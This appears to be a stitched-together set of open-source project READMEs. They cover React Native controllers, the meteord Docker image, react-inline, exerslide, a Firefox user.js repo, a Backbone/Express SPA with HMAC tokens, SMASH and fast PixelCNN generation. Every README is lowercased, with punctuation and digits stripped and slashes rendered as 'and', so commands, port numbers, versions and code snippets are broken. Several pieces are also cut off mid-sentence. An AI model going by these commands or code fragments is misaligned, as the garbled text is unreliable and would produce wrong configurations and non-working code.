rest of your js files will be regular react native files you can see a complete example of index ios js here example and index ios js if you don t want the full explanation of what s going on in there just skip to the next step to perform the hijack define react on the top of the module like this var controllers require react native controllers var react controllers hijackreact note the react instance here is irregular it can t do many of the things that the original class can so keep its usage pretty close to our purpose we tried to keep the syntax familiar define your view controller skeleton like this var moviesapp controllers createclass render function return drawercontrollerios id drawer componentleft sidemenu componentright sidemenu tabbarcontrollerios id main tabbarcontrollerios item title movies icon require and img and home png and tabbarcontrollerios item tabbarcontrollerios item title search icon require and img and discover png and tabbarcontrollerios item and tabbarcontrollerios and drawercontrollerios note in this hierarchy you can only use view controllers you can t use your traditional react native components for a full list of all supported view controllers see the rest of this doc some of the view controllers in the hierarchy will have to contain your views these views are the regular react native components that you re used to you will normally define these components in a dedicated js module where react wasn t hijacked and you can use all of its goodness to hook up a view use the component attribute of the view controller in the jsx and provide the registered name of the component every view that you use has to be registered using appregistry registercomponent for example the movie list screen content is defined in movielistscreen js example and movielistscreen js and there it s also registered with appregistry registercomponent movielistscreen  movielistscreen we have to tell the react native bundler that we need the components that we just referenced the easiest way to do this and make sure their js files are included in our bundle is to require them you can add this right before you define your view controller hierarchy and and require all top level react components you refer to in the layout require and sidemenu require and movielistscreen require and searchscreen just like we register regular react native view modules we ll need to register the view controller module we ve just defined in the end of index ios js add the following lines controllerregistry registercontroller moviesapp  moviesapp and and this line makes the app actually start and initialize controllerregistry setrootcontroller moviesapp the view controller hierarchy we ve defined in index ios js references the top level screens of your app these screens are regular react native views they are the exact same components you ve been writing up until now in the previous step we ve referenced  top level components sidemenu  movielistscreen  searchscreen the best practice is to implement each of them as its own js module you can see them implemented here sidemenu js example and sidemenu js  movielistscreen js example and movielistscreen js  searchscreen js example and searchscreen js as you can see these are standard react native components they don t require any special changes due to our package the only requirement is that all of them are registered using react native s appregistry registercomponent only top level components referenced by the view controller hierarchy need to be registered register them by adding the following line at the end appregistry registercomponent movielistscreen  movielistscreen when implementing your components you may need to interact with one of the view controllers for example create a button that pushes a new screen to the navigation controller you have simple js api for this purpose available by require react native controllers this api is documented under the list of available view controllers available view controllers var

with adding custom views to the bottom of the navigation bar you can see this ui pattern in the native ios calendar app week days in the day view and the native ios health app segmented control in the dashboard tab this pattern can be implemented by adding a react component in your screen component s content not really on the nav bar and making it stick to top using absolute position the illusion that this component is part of the nav bar is achieved by wrapping it with navigationtoolbarios which provides a background with the same translucent effect the nav bar has you can see a working example of all this in the example project var controllers require react native controllers var navigationtoolbarios controllers navigationtoolbarios key segmented style top  width width height  position absolute segmentedcontrolios values one  two  three selectedindex this state segmentindexselected style styles segmentedcontrol onchange event this setstate segmentindexselected event

30490361, there are two main ways you can use docker with meteor apps they are  build a docker image for your app  running a meteor bundle with docker meteord supports these two ways let s see how to use meteord with this method your app will be converted into a docker image then you can simply run that image for that you can use meteorhacks and meteord onbuild as your base image magically that s only thing you have to do here s how to do it add following dockerfile into the root of your app from meteorhacks and meteord onbuild then you can build the docker image with docker build t yourname and app then you can run your meteor image with docker run d e mongourl mongodb and and url e mongooplogurl mongodb and and oplogurl p   yourname and app then you can access your app from the port  of the host system so with the above method meteord will download and install meteor each and every time that s bad especially in development so we ve a solution for that simply use meteorhacks and meteord devbuild as your base image warning don t use meteorhacks and meteord devbuild for your final build if you used it your image will carry the meteor distribution as well as a result of that you ll end up with an image with  mb for this you can directly use the meteord to run your meteor bundle meteord can accept your bundle either from a local mount or from the web let s see docker run d e mongourl mongodb and and url e mongooplogurl mongodb and and oplogurl v and mybundledir and bundle p   meteorhacks and meteord base with this method meteord looks for the tarball version of the meteor bundle so you should build the meteor bundle for os linux x and put it inside the and bundle volume this is how you can build a meteor bundle meteor build architecture os linux x and you can also simply give url of the tarball with bundleurl environment variable then meteord will fetch the bundle and run it this is how to do it docker run d e mongourl mongodb and and url e mongooplogurl mongodb and and oplogurl p   meteorhacks and meteord base docker compose yml dashboard image yourrepo and yourapp   mongo environment mongourl mongodb and and mongo and yourapp mailurl smtp and and some mailserver com  image mongo latest when using docker compose to start a meteor container with a mongo container as well we need to wait for the database to start up before we try to start the meteor app else the container will fail to start this sample docker compose yml file starts up a container that has used meteorhacks and meterod as its base and a mongo container it also passes along several variables to meteor needed to start up specifies the port number the container will listen on and waits  seconds for the mongodb container to start up before starting up the meteor container sometimes you need to rebuild binary npm modules if so expose rebuildnpmmodules environment variable it will take couple of seconds to complete the rebuilding process docker run d e mongourl mongodb and and url e mongooplogurl mongodb and and oplogurl e rebuildnpmmodules  p   meteorhacks and meteord binbuild there s currently    an issue relating to how the command or entry point is parsed so containers won t boot using the docker run commands as above instead joyent support has suggested the following workaround until their fix can be rolled out docker run d e mongourl mongodb and and url e mongooplogurl mongodb and and oplogurl p   entrypoint bash yourname and app and opt and meteord and runapp sh

preadd events against both add and reject events in combination to know when the log is completely caught up a hyperlog will refer to potentially many different logs as it replicates with others each with its own id bear in mind that each hyperlog s underlying leveldb contains a notion of what its own local id is if you make a copy of a hyperlog s leveldb and write different data to each copy the results are unpredictable and likely disastrous always only use the included replication mechanism for making hyperlog copies

33278407, transform inline styles defined in javascript modules into static css code and class names so they become available to e g the classname prop of react elements note since v  react inline is not tied to any specific user interface library so you don t have to use react to utilize this package using it for react components is just a logical consequence let s dive right into some code given the following button component import react from react import stylesheet from react inline import cx from classnames const oneof bool react proptypes class button extends react component render const size busy block classname this props const classes cx styles default styles size  block styles block classname button proptypes size oneof large  small  block bool busy bool export default button const styles stylesheet create default padding px px  fontsize  lineheight   cursor pointer  border px solid eda  borderradius  color fff  backgroundcolor ab  media only screen and max width px display block  width  focus color fff  backgroundcolor   bordercolor b disabled backgroundcolor ab  bordercolor eda  cursor not allowed  boxshadow none  opacity  pointerevents none large padding px px  fontsize  lineheight   borderradius  small padding px px  fontsize  lineheight   borderradius  block display block  width  react inline turns that into this code import react from react import cx from classnames const oneof bool react proptypes class button extends react component render const size busy block classname this props const classes cx styles default styles size  block styles block classname button proptypes size oneof large  small  block bool busy bool export default button const styles default button styles default  large button styles large  small button styles small  block button styles block and this css button styles default padding px px font size px line height   cursor pointer border px solid eda border radius px color fff background color ab button styles default

and max width px button styles default display block width  button styles large padding px px font size px line height   border radius px button styles small padding px px font size px line height   border radius px button styles block display block width  as you can see react inline has support for media queries pseudo classes and attribute selectors react inline provides both a node js api and a command line interface cli typically the cli will be all you need but let s start with the api first because it is the cli s foundation in order for react inline to work in your components surround each inline style specification with a stylesheet create call this actually does nothing except providing a hook for the extractor example var stylesheet require react inline var mystyles stylesheet create and and specification goes here the stylesheet specification format is explained further down stylesheet specification format note that the return value of stylesheet create must be assigned to a variable the name of the variable is used to distinguish multiple stylesheet create calls within a file this is the actual workhorse of react inline responsible for finding stylesheet create calls parsing the specifications replacing the calls with class name objects and generating the real css the function returns an object with a code and a css property holding the transformed source and the generated css respectively if no stylesheet create call was found in the source or all stylesheet specifications were empty the css property will have the value null example var extractor require react inline and extractor var js var stylesheet require react inline var react var result extractor transform js options console log result code and and var react require console log result css and and my style n border solid px red available options to pass as second argument and option and default and description and and and and and and filename and unknown and the name of the file for the source to transform this value is used in revised form as a prefix when generating css class names and and compressclassnames and false and set to true to shorten and obfuscate generated css class names a class name like myfile mystylesvar myname will so be converted to e g  bf and and mediamap and and this allows you to define media query shortcuts which are expanded on building the css example using phone media only screen and max width px as value for this option and a stylesheet spec having phone as a key that key will be translated to media only screen and max width px in the final css and and context and null and if set to an object each identifier found on the right hand side of a style rule is substituted with the corresponding property value of this object and and cachedir and null and if set to a string value e g tmp and cache and  the class name cache will be persisted in a file in this directory otherwise an in memory cache is used and and sourcemapname and null and if set to a string value a source map will be generated with the given name and returned as map  e g result map in the example above and asynchronously transforms the contents of a file example var extractor require react inline and extractor extractor transformfile path and to and file js  options function err result result and and code css synchronous version of transformfile returns the transformed contents of the filename example var extractor require react inline and extractor extractor transformfilesync path and to and file js  options and and code css searches for css files in sourcedir  concatenates their contents and writes the result to the return value of path join sourcedir filename example var bundler require react inline and bundler bundler bundle lib and  and public and bundle css  options available options and option and default and description and and and and and and globpattern and and css and the glob pattern to use when searching for files to bundle and react inline comes with a command line interface which allows you to extract inline styles generate css files and bundle them up for all your project s files in one go the binary installed by npm is called react inline extract a shorter alias is available under the name rix here s the output of react inline extract help usage react inline extract options source directory output directory module id module id h help output usage information v version output the version number c config file json configuration file no file or means stdin w watch continually rebuild x extension

css a babelize add a babel transformation step configure it with a babelrc in a single sentence the command finds modules with the given module identifiers in the source directory and places a transformed copy of each module into the output directory example react inline extract relativize follow requires pom bundle and public and bundle css src and lib and client server here s what you can put inside the parentheses of stylesheet create simple styles mybutton border solid px ccc  backgroundcolor lightgray  display inline block myinput width   and and etc an inline style is not specified as a string instead it is specified with an object whose properties form the css ruleset for that style a property s key is the camelcased version of the rule name and the value is the rule s value usually a string pseudo classes and attribute selectors mybutton border solid px ccc  backgroundcolor lightgray  display inline block  cursor pointer  focus bordercolor aaa hover bordercolor ddd  active bordercolor eee disabled cursor not allowed  opacity  hover backgroundcolor transparent as you can see pseudo classes and attribute selectors can be nested arbitrarily deep but you don t have to use nesting here is the example from above in the un nested version mybutton border solid px ccc  backgroundcolor lightgray  display inline block  cursor pointer mybutton focus bordercolor aaa mybutton hover bordercolor ddd mybutton hover active bordercolor eee mybutton disabled cursor not allowed  opacity  mybutton disabled hover backgroundcolor transparent media queries mybutton border solid px ccc  and and myinput width   and and media only screen and max width px mybutton borderwidth  myinput fontsize  media only screen and max width px mybutton borderwidth  hover borderwidth  media queries can appear at the top level as shown above or nested in the style mybutton border solid px ccc  media only screen and max width px borderwidth  active bordercolor blue media only screen and max width px and and given you set phone media only screen and max width px  tablet media only screen and max width px as mediamap option for the transformation the above spec can be simplified to mybutton border solid px ccc  phone borderwidth  active bordercolor blue tablet and and expressions in style rules you can do simple arithmetic and string concats on the right hand side of style rules each identifier found is substituted with the corresponding property value of the context object provided as option example for a given context mycolors green ff  myurl path and to and image png mybutton color mycolors green borderwidth  and px  backgroundimage url and myurl and install via npm npm install react inline save dev if you just want to see some example output for a file head over to this repo s quick example example and quick and there you will find the code for a simple button component together with its transformed version and css file both with and without compressed class names the code for a more sophisticated example can be found in the repo s example directory example and after cloning this repo see the example s readme for more info on how to run it apart from simple arithmetic and string concats a stylesheet specification cannot contain advanced dynamic stuff because although the transformer parses the source input it is not compiled if you really need to add truly dynamic styles that s what the style attribute and prop was made for style also has the positive side effect of taking precedence over class names writing a gulp and grunt and browserify and webpack and you name it plugin for react inline will be a hard nut to crack this is due to the fact that in order to properly compress all css class names used in a project the transformer needs some global context in form of a cache holding the generated class names for each file and such a plugin needs to be isomorphic i e it must produce the same output when transpiling for the client and the

66282278, a tool to generate simple html slideshows and tutorials from text files the primary intent is to generate interactive presentations for teaching web technologies built on react and webpack presentations and sites built with exerslide exerslide comes in two parts a global command line interface to initialize and build presentations and a module that contains further dependencies to build the presentation  first install the exerslide cli package globally bash npm install g exerslide cli  initialize a new project and presentation by creating a new folder and running exerslide init sh mkdir mypresentation cd mypresentation exerslide init mypresentation  create and edit slides in slides and sh exerslide serve to start a local webserver to view the presentation note most of the of the build process is handled by webpack exerslide init or exerslide copy defaults copies exerslide config js exerslide config and webpack config js webpack config into the project most of the default behavior here is defined in these files and can be customized slides are defined as text files which contain content and metadata the metadata is defined in an optional yaml front matter block followed by the title title of the slide this is the content basically just like jekyll by default exerslide determines the order of the slides by sorting the file names alphabetically for example if you name your slides as  intro md  maintopic md  end md exerslide will pick up the slides in that order note aside from the order you can name the files however you want slides can be grouped as chapters by putting all slides of a chapter into a folder for example  intro md  chapter and  problem md  solution md  summary md like with filenames exerslide doesn t care about the actual name of the exerslide provides the ability to configure certain aspects of a slide via the yaml front matter it currently supports the following optional configuration title the value of title will be rendered as an h element above the content toc the name to show in the table of contents if not present the title option will be used if that one is not present either it will show slide x where x is the index of the slide chapter the name of the chapter this slide belongs to it serves two purposes  it can be used as alternative to group slides by chapter i e you don t have to use folders if you don t want to  this name will be shown for the chapter in the progress bar and table of contents of the presentation if you organize your slides in folders you only have to define this key in the first slide of the folder all other slides inherit the chapter name from the first slide layout the name of the layout layouts to use overwrites layout inference contenttype the markup language used for the content overwrites content type content types inference classnames a list of css class names to be added to the root of page and presentation this allows for sharing specific styles across slides style css style declaration additional css to use on this slide id a name that is unique among the slides this provides a safer way to link between slides layoutdata additional data to be sent to the layout used for this slide hidetoc the table of contents is hidden for this slide if set to true scale exerslide automatically adjusts the font size for different screen widths to ensure that the slides are always readable scale lets you customize the behavior to some degree note this option can only be set on the first slide false if set to false  no adjustments will be made object otherwise the value can be object with up to three properties contentwidth specifies the content width in em s this can be thought of as how many words and characters per line should be shown columnwidth a number between  and  how much of the screen width should be occupied by the content maxfontsize don t make the font any larger than this value in pixel layouts define how the content and layout data of a slide are structured for example the column layout renders the content in multiple columns layouts are implemented as react components which allows you to create arbitrarily complex layouts for example the javascriptexercise layout renders a text editor containing the content of the slide and contains logic to validate the user s solution the primary idea behind exerslide is to move all the behavior in reusable layouts to keep the actual content creation simple which layout to use for a slide is determined by the following process  the slide s layout metadata field  if not present the layout is inferred from the file extension this mapping can be configured configuration  if it can t be inferred no layout is used column layout packages and exerslide plugin twocolumn layout and javascriptexercise layout packages and exerslide plugin javascriptexercise layout and both the layout field and the file extension mapping expect the layout name as value exerslide will look for a file with the same name ignoring the file extension in the layouts and folder of the project itself or any loaded plugin plugins example if the slide contains layout columns and the exerslide plugin columns layout is loaded which it is by default  then exerslide will look for and layouts and column js exerslide plugin columns layout and layouts and columns js note exerslide will show an error if there are multiple layouts with the same name if you want to specify a layout of a specific plugin you can use layout columns layout columns layouts have access to the layoutdata metadata option of a slide this allows a slide to pass arbitrary data to the layout what data to pass depends on the layout for example the columns layout can be configured to use a different column divider layout column layoutdata divider mydivider this is the first column mydivider this is the second column as layouts define the structure of a slide the master layout defines the structure of the whole page the default master layout master layout doesn t do much it renders a table of contents and progress component and the current the default master layout is copied into the project folder so you can customize it more easily layouts primarily describe how a slide is structured while there can be layouts that expect the content in a specific format and language the javascriptexercise layout expects the content to be javascript  there are usually parts that allow you to write content in any format you like you can decide which markup language to use for such content e g markdown html or something else all you need is a function that can convert the content to something renderable in react string react component etc exerslide provides support for html and markdown out of the box via plugins which converter to use is determined by  the contenttype option in the front matter this allows you to set the type explicitly the value is usually a media type name this is not common  the file extension if contenttype is not specified the media type of the file is determined from the file extension e g we get text and x markdown for an md file like with layouts exerslide will automatically look for matching content type converters in the project itself and any loaded plugin it will look for matching files in the contenttypes folder e g if the slide contains contenttype text and x markdown and the exerslide plugin markdown converter plugin is loaded it will look and contenttypes and textx markdown js exerslide plugin markdown converter and contenttypes and textx markdown js note just like for layouts you can prefix the type name with a plugin css dependencies are bundled into two css files one file contains the css dependencies of react components such as for codemirror and layouts if a react component has css dependencies then usually because it doesn t function properly without it the other file bundles the css listed in exerslide config js  stylesheets and and exerslide config js module exports stylesheets bootstrap and dist and css and bootstrap css   and css and style css the default setup includes foundation  font awesome and a highlight js theme you can adjust these entries to your needs as mentioned earlier exerslide is configured through exerslide config js and webpack config js you can edit any of them to adjust the build process to your liking this file contains settings for exerslide itself it primarily defines paths and settings for the exerslide s slide loader stylesheets an array of paths to stylesheets that should be bundled with the presentation defaultlayouts an object that maps file extensions to layout names plugins a list of module names to load as plugins exerslide plugin can be omitted from the name plugins are intended to provide additional layouts content type converters or other functionality settings you probably won t have to change out absolute path to the output directory slidepaths a list if patterns that will match all slide files these patterns are used by to watch for new and deleted slides processslides a function to process the list of paths matched by slidepaths this can be used to filter out or reorder files basically a standard webpack configuration file with sensible default settings exerslide will augment this configuration with additional options to ensure that the build process runs properly the configuration object contains an additional slideloader option with which custom slide transformers can be specified initializes a new presentation project builds the presentation if outdir is present it will save the presentation in that folder instead of what is configured in exerslide config js continuously builds the presentation if outdir is present it will save the presentation in that folder instead of what is configured in exerslide config js starts a web server for local development and rebuilds the presentation when any slide or other dependency javascript files layout css changed plugins are intended to provide additional layouts content type converters and other functionality when looking for layouts or content type converters exerslide will look into each plugin s layouts and and contenttypes and folders additionally if the plugin has a init js file in its root folder which exports a function the function will be called and gets passed the exerslide config and webpack config objects this allows plugins to add additional slide transforms or update the webpack configuration the default layouts and content converters which are coming with exerslide are implemented as plugins have a look at the packages packages and folder for examples webpack config and packages and exerslide cli and scaffolding and webpack config js exerslide config

40386835, an attempt to make firefox suck less unlike other resources out there this repo isn t only about privacy and security but covers issues like browser speed ui and ux annoyances and disabling and removing unnecessary bloatware as well some in my opinion overly restrictive or annoying best security practices have been omitted on purpose i don t want my main browser to feel like it s in private window mode all the time for that approach tor browser would be a better choice than standard firefox anyways i want my main browser to remember its history passwords form fields and so on ymmv this repo is meant as an additional resource to improve aspects of firefox after you ve done all the standard steps to ensure a base level of security have some basic security and privacy addons installed ublock origin privacy badger https everywhere noscript disconnect self destructing cookies etc  run a decent firewall maybe connect over a vpn maybe have a decent hosts file and so on and most important of all use your brain  don t just click on random stuff once you ve done that you probably don t need stuff like safe browsing and similar which gives a somewhat false sense of security and constantly sends data about your browsing habits to google none of the settings in this repository are blindly copied over from other sources each setting has been tested by me and deprecated settings are removed whenever necessary i m trying to keep the cruft level as low as possible only supporting settings that actually work in current firefox versions do not change any of these settings without understanding what they re doing this repo isn t meant for inexperienced users to apply these tweaks type about config into the url bar and use the config search bar to look up the individual settings found in user js

9604017, this project is supposed to be a starter kit helping the community build single page application architectures based on backbone js and express js frameworks a pragmatic approach is key the simplest implementation possible just to show the way not a finalized application it covers aspects of front end design as well as open api you are the one who can help project to grow join now and contribute your help is much appreciated description description application example example installation installation express js expressjs serving master page serving master page api end points api

optimization results optimization results deployment deployment spa infrastructure setup could be time consuming it s a typical problem to configure requirejs  initial routing and view manager to prevent memory leaks this project could be used as a good start to build your own single page application this project is a complete and minimal setup for building single page applications running on express js framework as back end and backbone js as front end spa itself is rather simple concept but it requires some infrastructure to have in place before building up a new application this project already includes this infrastructure themailer simple app for managing emails contacts tasks clone github repository git clone git github com alexanderbeletsky and backbone express spa git install npm dependencies npm install install bower dependencies bower install run app development mode  node app js in api oriented architecture back end is responsible for  main purposes serving master page html providing api end points for web client master page views and master ejs is main and typically one html page returned from server it includes all styles and javascript provides very basic layout and placeholder for application after master page is served back to client the rest of ui and logic is build by backbone js to serve master pages application includes middleware component servemaster js source and middleware and servemaster js it would respond with master page html for any request except the requests for and api  and components  and css and or and js api is http json based end points sources are located at source and api each api module returns a function that takes app instance and setup http verb handler for a route module exports function app app get and api and emails  function req res res json status get and api and users app post and api and emails  function req res res json status post and api and users app put and api and emails and id  function req res res json status put and api and users and and req params id app del and api and emails and id  function req res res json status delete and api and users and and req params id to enable api end point you should modify app js file like and and api endpoints require and source and api and emails app require and source and api and contacts app require and source and api and tasks app while you design new open api authorization is probably one of the most important topics to consider traditional authorization algorithms are typically using some kind of token based authorization means each user of api is getting registered and special token pseudo random looking string is issued and associated with that user token contains user identification and some meta info encrypted with some simple algorithm as base for each request users sends this token in http headers of query  server lookups for this token and if it finds match between encrypted userid and token request treated as authenticated tokens always have to be transported by secured channel as ssl the routine could be slitted to such steps  client signs ups to api by sending username and password  client get registered password hashed and placed to users collection in db  authorization token is issued  client receives token back  server validates the token if it s valid request treated as authenticated note token validation procedure doesn t require any db request everything all depends on computation let s take a look how to issue new authorization token we typically want to reduce token lifetime in case it s stolen so we want to include some meta information about time it s issued as well it s owner this information is concatenated and hmac algorithm applied using servers private key after we add same info in open text and encrypt result by base var timespamp moment var message username and and timespamp valueof var hmac crypto createhmac sha  authsignkey update message digest hex var token username and and timespamp valueof and and hmac var tokenbase new buffer token tostring base here authsignkey is private server key and tokenbase is the final result sent back to client client stores the token to cookie or localstorage and using it for each api request as part of basic authentication header request js example request get url url auth user username password token  function err resp error err response resp jquery example type get  url index php  datatype json  async false username username password token success function backbone sync example backbone ajax function var defaults arguments   extend defaults username username password token return backbone ajax apply backbone  arguments now server receives token back and request need to be authenticated  server decodes token base and parses out all token information simple split by  server computes hmac signature of received username and timestamp using the same private server key  it compares it with hmac received in token  if hmac s are different request is not authorized  reply  otherwise server checks token ttl if expires   reply  otherwise request is authenticated if token is compromised or wrong hmac guarantees that signatures will never match except attacker is aware of server private key api exposes few methods and api and auth and signup and api and auth and login and api and auth and validate signup used as initial client registration login is called each time new token have to issued validate is used to check token validity it s used as internal method mostly there is source and middleware and auth js source and middleware and auth js that exposes createtoken and validatetoken functions create token is applied to signup and login api methods validatetoken is applied on every api that requires authorization checkout test and api and auth specs js test and api and auth specs js that specifies how authorization works in details source and api and auth js source and api and auth js for end

handler is responsible for starting up new application application run function takes viewmanager instance and core and viewmanager js public and js and core and viewmanager js is responsible for disposing views during switch from one router to another besides of that it handles transitions during application switch application is concept of grouping models  collections  views of unit in one place the rule is one route one application router matches the route loading the application entry point and passes viewmanager or any other parameters like id s or query strings into application all applications are apps public and js and apps folder app js public and js and apps and home and app js is entry point of application and it s responsible for several things fetching initial application data instantiating main view of application define function require var mainview require and views and mainview return run function viewmanager var view new mainview viewmanager show view main view responsible for ui of application it s quite typically that main view is only instantiating subviews and passing the models and collections further down mainview js public and js and apps and home and views and mainview js keeps track of subviews in this subviews arrays each subview will be closed by viewmanager dispose public and js and core and viewmanager js l function var mainview backbone view

and and templates and headerview  render function this el html this template title backbone spa boilerplate return this transitions is a very nice feature for single pages applications it adds the visual effects of switching from one application to another once you decide to have transitions in your app simply modify master ejs views and master ejs and add data transition attribute to application div testing is key of quality product both sides front and back have to covered with tests to tackle the complexity to execute all tests run npm test modern web applications contain a lot of javascript and css files while application is loading all that recourses have to be in place so browser issuing http requests to fetch them as more application grow as more requests need to be done as slower initial loading is there are two ways of optimization of initial application loading concatenate and minify decrease http request gzip content decrease payload size application could operate in several modes development production in development mode we don t care about optimizations at all even more we are interested to get not processed source code to be able to debug easily in production mode we have to apply as much effort as possible to decrease initial load time gruntfile js gruntfile js contains all required configuration to run grunt the result of the grunt run is new folder and public and build and public and build and that contains  files main css  main js concatenated and minified javascript and css code the configuration distinction goes in app js app js file app configure development  function app use express errorhandler and and apply error handler app use express static path join dirname public app use middleware servemaster development and and apply development mode master page app configure production  function app use express compress and and apply gzip content app use express static path join dirname public  maxage onemonth app use middleware servemaster production and and apply production mode master page servemaster js source and middleware and servemaster js middleware component is would serve different version of master page for different mode in development mode it would use uncompressed javascript and css in production mode ones that placed in and public and build and public and build and folder caching is in general good since it helps to application to be loaded faster but it could hurt while you re deploy application browsers do not track the actual content of file so if the content has changed but url still the same browser will ignore that besides different browsers have different caching strategies ie for instance is famous with is aggressive caching cache busting is widely adopted technique there are some different implementations for that but one of the most effective is name your resources in the way so if content has changed the name of resource would change as well basic implementation is to prefix file names with hash computed on file contents it also produces and source and client and index js and source and client and index js file servemaster js source and middleware and servemaster js uses to render production master page correctly now everything that either js or css content is changed build would produce new files and they are guaranteed to be loaded by browser again on a left side you see application running in development mode on a right side in production mode optimization results and public and img and optimizations png raw true even for such small application as themailer

42649347, hello this project needs some explanation the idea is to take a highly coupled highly ugly view controller implementation and to incrementally isolate abstract and test components of it reducing dependencies of each piece along the way i ve tried to use this project to demonstrate some of the architectural design principles i ve been developing for swift the source probably won t make much sense outside of the context of the talk but perhaps in time i ll annotate the source with docstrings so that it can be read on its own if you re reading this outside the context of my talk i ll offer this caveat all added layers of abstraction also add complexity not all of these steps will necessarily be worth it given the tradeoffs of your own project this project attempts to demonstrate aggressive isolation for instructive purposes but i don t always advocate that in practice the progressive refactorings are represented in the git history head represents where the refactoring stopped you ll want to step back to the first revision then step forward to see how each step was refactored i did these refactorings pretty quickly you should feel free to try your hand at cleaning up this awful view controller on your own send me pull requests and we ll chat about em

100662109, an experimental technique for efficiently exploring neural architectures smash bypasses the need for fully training candidate models by learning an auxiliary hypernet to approximate model weights allowing for rapid comparison of a wide range of network architectures at the cost of a single training run note that this code was written in pytorch   and is not guaranteed to work on   until next week when i get a chance to update my own version please also be aware that while thoroughly commented this is research code for a heckishly complex project i ll be doing more cleanup work to improve legibility soon to run with default parameters simply call python train py this will by default train a smash net with nominally the same parametric budget as a wrn   note that validation scores during training are calculated using a random architecture for each batch and are therefore sort of an average measure after training to sample and evaluate smash scores call python eval py smash yourmodelnamehere pth this will by default sample  random architectures then perturb the best found architecture  times then employ a sort of markov chain to further perturb the best found architecture to select the best architecture and train a resulting net then call python train py smash yourmodelnameherearchs npz this will by default take the best architectuure there are lots of different options including a number of experimental settings such as architectural gradient descent by proxy in op multiplicative gating variable nonlinearities setting specific op configuration types take a look at the trainparser in utils py for details though note that some of these weirder ones may be deprecated this code has boilerplate for loading imagenetx and modelnet but doesn t download or preprocess them on its own it supports model parallelism on a single node and half precision training though simple weightnorm is unstable in fp so you probably can t train a smash network with it this readme doc is in very early stages and will be updated soon

82704116, real time generation of   by  images naive generation left vs fast generation right we have tested our code with python  and tensorflow   you may need to make small changes for other versions of python or tensorflow instructions to run run the script with cudavisibledevices  python generate py checkpoint and path and to and paramscifar ckpt savedir and path and to and save and generated and images the script will continually generate images in a loop and write out the images to savedir you can exit the script at any time by interrupting with control c pixelcnn and and is a generative model that uses all previously generated pixels as information to generate the next pixel that is to generate the th pixel in the image pixelcnn and and will look at pixels   to model the output distribution of pixel  p pixel  and pixel   pixel  similarly pixel  will look at pixels   and this process continues for all pixels this property makes pixelcnn an autoregressive model where each pixel is modeled by the history of previous pixels what makes pixelcnn unique is that it uses clever fast methods to coalesce information from previous pixels which is crucial for training speed assets and wavenet png the wavenet graph on the left looks like a binary tree a node is convolved with it s nth previous neighbor where n is a power of  since n  the dilation  is increasing by a factor of two every layer the range of nodes that are combined together the receptive field  increases exponentially on every generation step information from all nodes in the receptive field  in the picture must be combined a naive generation algorithm simply repeats the entire tree of computation for every generation step this is easy to implement but is slow you may have noticed that when generating consecutive outputs a large portion of the tree is reused for example call the current step in the picture t and imagine generating the output for t and  in this case three of the four orange nodes in the first hidden layer can be reused it is a waste of time to recompute them this brings us to the core of our method caching previously computed hidden states as illustrated in the image on the right we maintain a cache for each layer which holds previously computed hidden states the size of the cache is equal to the dilation factor of the hidden layer since the model must look back n steps at the hidden layer the cache acts like a queue the oldest hidden state is popped from the the front of the queue which is exactly equivalent to the normal dilated convolution after a hidden state is computed it must then be pushed into the back of the queue to be used exactly n steps in future from now this process repeats itself giving a fast generation algorithm that avoids the exponential computation of the naive approach the previous section used dilated convolutions in this case node t is convolved with node t n  and node t and  is convolved with node t and  n this implies that the number of hidden states in a layer is equal to the number of inputs making caching straightforward however using strided convolutions makes the problem more difficult because the number of states in a hidden layer is different from the number of inputs strided convolutions are downsampling layers this means that there are fewer hidden states than inputs a typical convolution will convolve over a local neighborhood and then slide  position over and repeat the procedure for example nodes t  and t will be convolved and then nodes t and t and  will be convolved striding affects the number of positions that the convolution will slide over in the previous example the stride is  however when the stride is greater than  the input is downsampled for example take the stride to be  nodes t  and t will be convolved and then nodes t and  and t and  will be convolved since the convolution has slided  positions over this means every pair of inputs to the layer only produces one output so the number of hidden states is smaller than the number of inputs because of the differing number of hidden states caches cannot be updated in every timestep thus each cache has an additional property cache every  where the cache is only updated every cache every steps every downsampling layer increases the cache every property of the layer by the stride conversely every upsampling layer decreases the cache every property of the layer by the stride assets and strided png the figure above shows an example model with  upsampling and  downsampling layers each with a stride of  orange nodes are computed in the current timestep blue nodes are previously cached states and gray nodes are not involved in the current timestep at the first timestep t   the first input is used to compute and cache all nodes for which there is sufficient information to generate including the first four outputs at t   there are no nodes that have sufficient information to be computed but the output for t  has already been computed at t  at t   there is one new node that now has sufficient information to be computed although the output for t  has also been computed at t  the t  scenario is similar to t  at t   there is enough information to compute multiple hidden states and generate the next four outputs this is analogous to the t  scenario t  is analogous to t   and this cycle is followed for all future time steps in our code we also use a property run every which is equal to the cache every property of the next layer this allows us to avoid computation if the next layer is simply going to ignore its input after understanding the previous sections it should seem relatively straightforward to generalize the d example to the d case indeed our method generalizes with very few changes the caches for each layer are now d with a height equal to the filter height and a width equal to the image width after an entire row is generated the oldest row of the cache is popped and the new row is pushed because strided convolutions are used we use the cache every idea detailed in the previous section pixelcnn maintains two streams of computation a vertical stream and a horizontal stream oversimplifying the details a bit the vertical stream looks at all pixels above the current pixel while the horizontal stream looks at all pixels immediately left of the current pixel satisfying the autoregressive property in the d case see the pixelcnn papers for a more precise explanation the horizontal stream also takes in the vertical stream as another input in our code we compute the vertical stream one row at a time cache it and use it to compute the horizontal stream and the generated output one pixel at a time and with this we are able to achieve orders of magnitude speedups for pixelcnn and and generation increasing the batch size demonstrates the scalability of our method while the naive implementation scales linearly with the batch size because of  gpu utilization  our method enjoys superior scaling because of its minimal computational requirements article ramachandranfast title fast generation for convolutional autoregressive models  author

design labs all animation are asynchronous and are performed on sublayers bfpapercheckboxes work right away with pleasing default behaviors however they can be easily customized the checkmark color and tap circle color both positive and negative for checked and unchecked are all readily customizable via public properties you can also set whether or not the tap circle should appear from the location of the tap or directly from the center of the control by default bfpapercheckboxes use smart color which will match the tap circle s positive color to the color of the checkmark checkmarkcolor you can set your own colors via positivecolor and negativecolor note that setting these disables smart color functionality note try not to use super slow animation times it breaks the visual effects not the functionality though plus why would you a bool representing the state of the checkbox yes means checked no means unchecked go steelers a cgfloat representing the duration of the animations which take place on touch down default is  f seconds note that negative values will be converted to the default no funny business a cgfloat representing the duration of the animations which

